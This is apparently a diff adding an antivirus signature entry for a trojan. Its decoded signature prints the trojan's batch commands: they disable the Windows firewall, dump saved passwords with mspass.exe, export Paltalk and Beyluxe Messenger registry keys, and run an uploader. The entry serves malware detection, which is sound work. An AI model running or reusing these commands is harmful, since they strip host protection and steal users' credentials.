@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36670
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off netsh firewall set opmode disable start mspass.exe /stext mspass.txt regedit /e c:\floyd\pal.reg "hkey_current_user\software\paltalk" regedit /e c:\floyd\beyluxe.reg "hkey_current_user\software\beyluxe messenger" start upload.exe 
